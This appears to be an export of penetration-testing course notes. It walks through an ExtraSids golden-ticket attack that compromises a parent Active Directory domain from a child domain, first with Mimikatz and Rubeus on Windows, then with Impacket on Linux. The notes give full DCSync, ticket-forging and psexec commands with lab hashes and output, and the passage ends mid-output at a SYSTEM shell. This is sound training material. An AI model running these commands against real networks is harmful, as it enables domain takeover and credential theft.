    "excerpt": "--- SID History Primer The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user'...",
    "category": "02_CPTS",
    "content": "\n\n---\n\n## SID History Primer\n\nThe [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.\n\nSID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.\n\nThis token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.\n\n---\n\n## ExtraSids Attack - Mimikatz\n\nThis attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the `SIDHistory` to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.\n\nTo perform this attack after compromising a child domain, we need the following:\n\n- The KRBTGT hash for the child domain\n- The SID for the child domain\n- The name of a target user in the child domain (does not need to exist!)\n- The FQDN of the child domain.\n- The SID of the Enterprise Admins group of the root domain.\n- With this data collected, the attack can be performed with Mimikatz.\n\nNow we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.\n\nSince we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.\n\n#### Obtaining the KRBTGT Account's NT Hash using Mimikatz\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt\n[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain\n[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server\n[DC] 'LOGISTICS\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 11/1/2021 11:21:33 AM\nObject Security ID   : S-1-5-21-2806153819-209893948-922872689-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: 9d765b482771505cbe97411065964d5f\n    ntlm- 0: 9d765b482771505cbe97411065964d5f\n    lm  - 0: 69df324191d4a80f0ed100c10f20561e\n```\n\nWe can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output above.\n\n#### Using Get-DomainSID\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainSID\n\nS-1-5-21-2806153819-209893948-922872689\n```\n\nNext, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet with a command such as `Get-ADGroup -Identity \"Enterprise Admins\" -Server \"INLANEFREIGHT.LOCAL\"`.\n\n#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n\ndistinguishedname                                       objectsid                                    \n-----------------                                       ---------                                    \nCN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519\n```\n\nAt this point, we have gathered the following data points:\n\n- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`\n- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`\n- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: `hacker`\n- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`\n- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`\n\nBefore the attack, we can confirm no access to the file system of the DC in the parent domain.\n\n#### Using ls to Confirm No Access\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> ls \\\\academy-ea-dc01.inlanefreight.local\\c$\n\nls : Access is denied\nAt line:1 char:1\n+ ls \\\\academy-ea-dc01.inlanefreight.local\\c$\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (\\\\academy-ea-dc01.inlanefreight.local\\c$:String) [Get-ChildItem], UnauthorizedAccessException\n    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand\n```\n\nUsing Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.\n\n#### Creating a Golden Ticket with Mimikatz\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> mimikatz.exe\n\nmimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt\nUser      : hacker\nDomain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)\nSID       : S-1-5-21-2806153819-209893948-922872689\nUser Id   : 500\nGroups Id : *513 512 520 518 519\nExtra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519 ;\nServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt\nLifetime  : 3/28/2022 7:59:50 PM ; 3/25/2032 7:59:50 PM ; 3/25/2032 7:59:50 PM\n-> Ticket : ** Pass The Ticket **\n\n * PAC generated\n * PAC signed\n * EncTicketPart generated\n * EncTicketPart encrypted\n * KrbCred generated\n\nGolden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session\n```\n\nWe can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.\n\n#### Confirming a Kerberos Ticket is in Memory Using klist\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> klist\n\nCurrent LogonId is 0:0xf6462\n\nCached Tickets: (1)\n\n#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL\n        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL\n        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent\n        Start Time: 3/28/2022 19:59:50 (local)\n        End Time:   3/25/2032 19:59:50 (local)\n        Renew Time: 3/25/2032 19:59:50 (local)\n        Session Key Type: RSADSI RC4-HMAC(NT)\n        Cache Flags: 0x1 -> PRIMARY\n        Kdc Called:\n```\n\nFrom here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.\n\n#### Listing the Entire C: Drive of the Domain Controller\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> ls \\\\academy-ea-dc01.inlanefreight.local\\c$\n Volume in drive \\\\academy-ea-dc01.inlanefreight.local\\c$ has no label.\n Volume Serial Number is B8B3-0D72\n\n Directory of \\\\academy-ea-dc01.inlanefreight.local\\c$\n\n09/15/2018  12:19 AM    <DIR>          PerfLogs\n10/06/2021  01:50 PM    <DIR>          Program Files\n09/15/2018  02:06 AM    <DIR>          Program Files (x86)\n11/19/2021  12:17 PM    <DIR>          Shares\n10/06/2021  10:31 AM    <DIR>          Users\n03/21/2022  12:18 PM    <DIR>          Windows\n               0 File(s)              0 bytes\n               6 Dir(s)  18,080,178,176 bytes free\n```\n\n---\n\n## ExtraSids Attack - Rubeus\n\nWe can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.\n\n#### Using ls to Confirm No Access Before Running Rubeus\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> ls \\\\academy-ea-dc01.inlanefreight.local\\c$\n\nls : Access is denied\nAt line:1 char:1\n+ ls \\\\academy-ea-dc01.inlanefreight.local\\c$\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : PermissionDenied: (\\\\academy-ea-dc01.inlanefreight.local\\c$:String) [Get-ChildItem], UnauthorizedAcces \n   sException\n    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand\n\t\n<SNIP> \n```\n\nNext, we will formulate our Rubeus command using the data we retrieved above. The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.\n\n#### Creating a Golden Ticket using Rubeus\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb>  .\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt\n\n   ______        _                      \n  (_____ \\      | |                     \n   _____) )_   _| |__  _____ _   _  ___ \n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v2.0.2 \n\n[*] Action: Build TGT\n\n[*] Building PAC\n\n[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)\n[*] SID            : S-1-5-21-2806153819-209893948-922872689\n[*] UserId         : 500\n[*] Groups         : 520,512,513,519,518\n[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519\n[*] ServiceKey     : 9D765B482771505CBE97411065964D5F\n[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5\n[*] KDCKey         : 9D765B482771505CBE97411065964D5F\n[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5\n[*] Service        : krbtgt\n[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL\n\n[*] Generating EncTicketPart\n[*] Signing PAC\n[*] Encrypting EncTicketPart\n[*] Generating Ticket\n[*] Generated KERB-CRED\n[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'\n\n[*] AuthTime       : 3/29/2022 10:06:41 AM\n[*] StartTime      : 3/29/2022 10:06:41 AM\n[*] EndTime        : 3/29/2022 8:06:41 PM\n[*] RenewTill      : 4/5/2022 10:06:41 AM\n\n[*] base64(ticket.kirbi):\n      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoR8bHUxPR0lTVElDUy5JTkxBTkVG\n      UkVJR0hULkxPQ0FMojIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5M\n      T0NBTKOCBDIwggQuoAMCARehAwIBA6KCBCAEggQc0u5onpWKAP0Hw0KJuEOAFp8OgfBXlkwH3sXu5BhH\n      T3zO/Ykw2Hkq2wsoODrBj0VfvxDNNpvysToaQdjHIqIqVQ9kXfNHM7bsQezS7L1KSx++2iX94uRrwa/S\n      VfgHhAuxKPlIi2phwjkxYETluKl26AUo2+WwxDXmXwGJ6LLWN1W4YGScgXAX+Kgs9xrAqJMabsAQqDfy\n      k7+0EH9SbmdQYqvAPrBqYEnt0mIPM9cakei5ZS1qfUDWjUN4mxsqINm7qNQcZHWN8kFSfAbqyD/OZIMc\n      g78hZ8IYL+Y4LPEpiQzM8JsXqUdQtiJXM3Eig6RulSxCo9rc5YUWTaHx/i3PfWqP+dNREtldE2sgIUQm\n      9f3cO1aOCt517Mmo7lICBFXUTQJvfGFtYdc01fWLoN45AtdpJro81GwihIFMcp/vmPBlqQGxAtRKzgzY\n      acuk8YYogiP6815+x4vSZEL2JOJyLXSW0OPhguYSqAIEQshOkBm2p2jahQWYvCPPDd/EFM7S3NdMnJOz\n      X3P7ObzVTAPQ/o9lSaXlopQH6L46z6PTcC/4GwaRbqVnm1RU0O3VpVr5bgaR+Nas5VYGBYIHOw3Qx5YT\n      3dtLvCxNa3cEgllr9N0BjCl1iQGWyFo72JYI9JLV0VAjnyRxFqHztiSctDExnwqWiyDaGET31PRdEz+H\n      WlAi4Y56GaDPrSZFS1RHofKqehMQD6gNrIxWPHdS9aiMAnhQth8GKbLqimcVrCUG+eghE+CN999gHNMG\n      Be1Vnz8Oc3DIM9FNLFVZiqJrAvsq2paakZnjf5HXOZ6EdqWkwiWpbGXv4qyuZ8jnUyHxavOOPDAHdVeo\n      /RIfLx12GlLzN5y7132Rj4iZlkVgAyB6+PIpjuDLDSq6UJnHRkYlJ/3l5j0KxgjdZbwoFbC7p76IPC3B\n      aY97mXatvMfrrc/Aw5JaIFSaOYQ8M/frCG738e90IK/2eTFZD9/kKXDgmwMowBEmT3IWj9lgOixNcNV/\n      OPbuqR9QiT4psvzLGmd0jxu4JSm8Usw5iBiIuW/pwcHKFgL1hCBEtUkaWH24fuJuAIdei0r9DolImqC3\n      sERVQ5VSc7u4oaAIyv7Acq+UrPMwnrkDrB6C7WBXiuoBAzPQULPTWih6LyAwenrpd0sOEOiPvh8NlvIH\n      eOhKwWOY6GVpVWEShRLDl9/XLxdnRfnNZgn2SvHOAJfYbRgRHMWAfzA+2+xps6WS/NNf1vZtUV/KRLlW\n      sL5v91jmzGiZQcENkLeozZ7kIsY/zadFqVnrnQqsd97qcLYktZ4yOYpxH43JYS2e+cXZ+NXLKxex37HQ\n      F5aNP7EITdjQds0lbyb9K/iUY27iyw7dRVLz3y5Dic4S4+cvJBSz6Y1zJHpLkDfYVQbBUCfUps8ImJij\n      Hf+jggEhMIIBHaADAgEAooIBFASCARB9ggEMMIIBCKCCAQQwggEAMIH9oBswGaADAgEXoRIEEBrCyB2T\n      JTKolmppTTXOXQShHxsdTE9HSVNUSUNTLklOTEFORUZSRUlHSFQuTE9DQUyiEzARoAMCAQGhCjAIGwZo\n      YWNrZXKjBwMFAEDgAACkERgPMjAyMjAzMjkxNzA2NDFapREYDzIwMjIwMzI5MTcwNjQxWqYRGA8yMDIy\n      MDMzMDAzMDY0MVqnERgPMjAyMjA0MDUxNzA2NDFaqB8bHUxPR0lTVElDUy5JTkxBTkVGUkVJR0hULkxP\n      Q0FMqTIwMKADAgECoSkwJxsGa3JidGd0Gx1MT0dJU1RJQ1MuSU5MQU5FRlJFSUdIVC5MT0NBTA==\n\n[+] Ticket successfully imported!\n```\n\nOnce again, we can check that the ticket is in memory using the `klist` command.\n\n#### Confirming the Ticket is in Memory Using klist\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\htb> klist\n\nCurrent LogonId is 0:0xf6495\n\nCached Tickets: (1)\n\n#0>\tClient: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL\n\tServer: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL\n\tKerbTicket Encryption Type: RSADSI RC4-HMAC(NT)\n\tTicket Flags 0x40e00000 -> forwardable renewable initial pre_authent \n\tStart Time: 3/29/2022 10:06:41 (local)\n\tEnd Time:   3/29/2022 20:06:41 (local)\n\tRenew Time: 4/5/2022 10:06:41 (local)\n\tSession Key Type: RSADSI RC4-HMAC(NT)\n\tCache Flags: 0x1 -> PRIMARY \n\tKdc Called: \n```\n\nFinally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.\n\n#### Performing a DCSync Attack\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nPS C:\\Tools\\mimikatz\\x64> .\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm\n[DC] 'INLANEFREIGHT.LOCAL' will be the domain\n[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server\n[DC] 'INLANEFREIGHT\\lab_adm' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : lab_adm\n\n** SAM ACCOUNT **\n\nSAM Username         : lab_adm\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )\nAccount expiration   :\nPassword last change : 2/27/2022 10:53:21 PM\nObject Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001\nObject Relative ID   : 1001\n\nCredentials:\n  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6\n    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6\n    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6\n    lm  - 0: 6053227db44e996fe16b107d9d1e95a0\n```\n\nWhen dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller. The command for this would look like the following:\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Windows\n\n```powershell-session\nmimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm /domain:INLANEFREIGHT.LOCAL\n\n[DC] 'INLANEFREIGHT.LOCAL' will be the domain\n[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server\n[DC] 'INLANEFREIGHT\\lab_adm' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : lab_adm\n\n** SAM ACCOUNT **\n\nSAM Username         : lab_adm\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )\nAccount expiration   :\nPassword last change : 2/27/2022 10:53:21 PM\nObject Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001\nObject Relative ID   : 1001\n\nCredentials:\n  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6\n    ntlm- 0: 663715a1a8b957e8e9943cc98ea451b6\n    ntlm- 1: 663715a1a8b957e8e9943cc98ea451b6\n    lm  - 0: 6053227db44e996fe16b107d9d1e95a0\n```\n\n---\n\n## Next Steps\n\nNow that we've walked through child --> parent domain compromise from a Windows attack box, we'll cover a few ways to achieve the same if we are constrained to a Linux attack host.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/30-Attacking Domain Trusts - Child -> Parent Trusts - from Linux",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/30-Attacking Domain Trusts - Child -> Parent Trusts - from Linux.md",
    "title": "30 Attacking Domain Trusts   Child  > Parent Trusts   From Linux",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information: - The KRBTGT hash for the child domain - T...",
    "category": "02_CPTS",
    "content": "\n---\n\nWe can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:\n\n- The KRBTGT hash for the child domain\n- The SID for the child domain\n- The name of a target user in the child domain (does not need to exist!)\n- The FQDN of the child domain\n- The SID of the Enterprise Admins group of the root domain\n\nOnce we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.\n\n#### Performing DCSync with secretsdump.py\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::\n[*] Kerberos keys grabbed\nkrbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8\nkrbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e\nkrbtgt:des-cbc-md5:fee04c3d026d7538\n[*] Cleaning up...\n```\n\nNext, we can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format `DOMAIN_SID-RID`. For example, from the output below, we can see that the SID of the `lab_adm` user would be `S-1-5-21-2806153819-209893948-922872689-1001`.\n\n#### Performing SID Brute Forcing using lookupsid.py\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation\n\nPassword:\n[*] Brute forcing SIDs at 172.16.5.240\n[*] StringBinding ncacn_np:172.16.5.240[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689\n500: LOGISTICS\\Administrator (SidTypeUser)\n501: LOGISTICS\\Guest (SidTypeUser)\n502: LOGISTICS\\krbtgt (SidTypeUser)\n512: LOGISTICS\\Domain Admins (SidTypeGroup)\n513: LOGISTICS\\Domain Users (SidTypeGroup)\n514: LOGISTICS\\Domain Guests (SidTypeGroup)\n515: LOGISTICS\\Domain Computers (SidTypeGroup)\n516: LOGISTICS\\Domain Controllers (SidTypeGroup)\n517: LOGISTICS\\Cert Publishers (SidTypeAlias)\n520: LOGISTICS\\Group Policy Creator Owners (SidTypeGroup)\n521: LOGISTICS\\Read-only Domain Controllers (SidTypeGroup)\n522: LOGISTICS\\Cloneable Domain Controllers (SidTypeGroup)\n525: LOGISTICS\\Protected Users (SidTypeGroup)\n526: LOGISTICS\\Key Admins (SidTypeGroup)\n553: LOGISTICS\\RAS and IAS Servers (SidTypeAlias)\n571: LOGISTICS\\Allowed RODC Password Replication Group (SidTypeAlias)\n572: LOGISTICS\\Denied RODC Password Replication Group (SidTypeAlias)\n1001: LOGISTICS\\lab_adm (SidTypeUser)\n1002: LOGISTICS\\ACADEMY-EA-DC02$ (SidTypeUser)\n1103: LOGISTICS\\DnsAdmins (SidTypeAlias)\n1104: LOGISTICS\\DnsUpdateProxy (SidTypeGroup)\n1105: LOGISTICS\\INLANEFREIGHT$ (SidTypeUser)\n1106: LOGISTICS\\htb-student_adm (SidTypeUser)\n```\n\nWe can filter out the noise by piping the command output to grep and looking for just the domain SID.\n\n#### Looking for the Domain SID\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\"\n\nPassword:\n\n[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268\n```\n\nNext, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain `SID S-1-5-21-3842939050-3880317879-2865463114` and attach the RID of the Enterprise Admins group. [Here](https://adsecurity.org/?p=1001) is a handy list of well-known SIDs.\n\n#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\"\n\nPassword:\n[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114\n498: INLANEFREIGHT\\Enterprise Read-only Domain Controllers (SidTypeGroup)\n500: INLANEFREIGHT\\administrator (SidTypeUser)\n501: INLANEFREIGHT\\guest (SidTypeUser)\n502: INLANEFREIGHT\\krbtgt (SidTypeUser)\n512: INLANEFREIGHT\\Domain Admins (SidTypeGroup)\n513: INLANEFREIGHT\\Domain Users (SidTypeGroup)\n514: INLANEFREIGHT\\Domain Guests (SidTypeGroup)\n515: INLANEFREIGHT\\Domain Computers (SidTypeGroup)\n516: INLANEFREIGHT\\Domain Controllers (SidTypeGroup)\n517: INLANEFREIGHT\\Cert Publishers (SidTypeAlias)\n518: INLANEFREIGHT\\Schema Admins (SidTypeGroup)\n519: INLANEFREIGHT\\Enterprise Admins (SidTypeGroup)\n```\n\nWe have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user `hacker` to forge our Golden Ticket.\n\n- The KRBTGT hash for the child domain: `9d765b482771505cbe97411065964d5f`\n- The SID for the child domain: `S-1-5-21-2806153819-209893948-922872689`\n- The name of a target user in the child domain (does not need to exist!): `hacker`\n- The FQDN of the child domain: `LOGISTICS.INLANEFREIGHT.LOCAL`\n- The SID of the Enterprise Admins group of the root domain: `S-1-5-21-3842939050-3880317879-2865463114-519`\n\nNext, we can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).\n\n#### Constructing a Golden Ticket using ticketer.py\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[*] Creating basic skeleton ticket and PAC Infos\n[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker\n[*] \tPAC_LOGON_INFO\n[*] \tPAC_CLIENT_INFO_TYPE\n[*] \tEncTicketPart\n[*] \tEncAsRepPart\n[*] Signing/Encrypting final ticket\n[*] \tPAC_SERVER_CHECKSUM\n[*] \tPAC_PRIVSVR_CHECKSUM\n[*] \tEncTicketPart\n[*] \tEncASRepPart\n[*] Saving ticket in hacker.ccache\n```\n\nThe ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.\n\n#### Setting the KRB5CCNAME Environment Variable\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ export KRB5CCNAME=hacker.ccache \n```\n\nWe can check if we can successfully authenticate to the parent domain's Domain Controller using [Impacket's version of Psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.\n\n#### Getting a SYSTEM shell using Impacket's psexec.py\n\nAttacking Domain Trusts - Child -> Parent Trusts - from Linux\n\n```shell-session\ndrxh3kr@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5\n\nImpacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation\n\n[*] Requesting shares on 172.16.5.5.....\n[*] Found writable share ADMIN$\n[*] Uploading file nkYjGWDZ.exe\n[*] Opening SVCManager on 172.16.5.5.....\n[*] Creating service eTCU on 172.16.5.5.....\n[*] Starting service eTCU.....\n[!] Press help for extra shell 